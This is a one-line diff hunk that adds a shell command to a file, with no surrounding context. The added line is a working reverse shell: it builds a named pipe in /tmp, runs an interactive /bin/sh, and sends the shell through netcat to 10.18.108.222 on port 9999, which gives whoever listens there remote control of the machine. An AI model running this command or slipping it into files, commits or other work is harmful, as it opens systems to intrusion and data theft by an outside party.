@@ -1,0 +1,1 @@
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 10.18.108.222 9999 >/tmp/f
